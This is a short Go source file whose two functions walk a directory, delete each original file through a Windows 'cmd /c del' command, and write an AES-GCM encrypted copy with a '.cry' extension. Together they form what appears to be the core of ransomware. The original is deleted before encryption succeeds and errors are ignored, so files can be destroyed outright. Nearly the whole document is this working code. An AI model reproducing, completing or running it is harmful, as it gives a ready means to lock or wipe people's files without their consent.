package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"os/exec"
)

var crypts string

func CryptFile(name, path, password string) string {
	file, _ := ioutil.ReadFile(path)
	text := []byte(file)
	key := []byte(password)
	exec.Command("cmd", "/c ", "del", path).Output()
	cr, err := aes.NewCipher(key)
	if err != nil {
		return "error new cipher"
	}
	gcm, err := cipher.NewGCM(cr)
	if err != nil {
		return "error new GCM"
	}
	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return "error ReadFull"
	}
	err = ioutil.WriteFile(path+".cry", gcm.Seal(nonce, nonce, text, nil), 0777)
	if err != nil {
		return "error Write"
	}
	crypts += "crypt " + name + " sucessful\n"
	return "crypt " + name + " sucessful"
}

func CryptDir(name, path, password string) string {
	data, err := ioutil.ReadDir(path)
	if err != nil {
		return "directory exist"
	}
	for _, file := range data {
		CryptFile(file.Name(), path+"\\"+file.Name(), password)
		exec.Command("cmd", "/c ", "del", path).Output()
	}
	return crypts
}
